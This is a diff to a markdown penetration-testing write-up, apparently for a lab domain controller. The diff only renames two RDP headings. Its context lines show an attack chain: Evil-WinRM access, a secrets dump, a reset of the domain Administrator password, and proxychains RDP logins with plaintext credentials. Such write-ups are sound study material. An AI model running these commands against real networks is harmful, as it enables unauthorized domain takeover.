@@ -49,7 +49,7 @@ Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`
 
 ![[Dumping secrets from CORPDC-20240604140856658.webp]]
 
-## Connect to RDP
+## RDP to CORPDC
 
 $ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:kairos /p:K41r@s123` 
 
@@ -63,7 +63,7 @@ Even though you are a member of Domain Admins group, you can access the Administ
 
 Evil-WinRM* PS C:\Users\Administrator\Documents> `net user Administrator Hacker@123 /domain`
 
-#### Connect to RDP with the Administrator's credentials
+#### RDP to CORPDC with the Administrator's credentials
 
 $ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:Administrator /p:Hacker@123` 
 
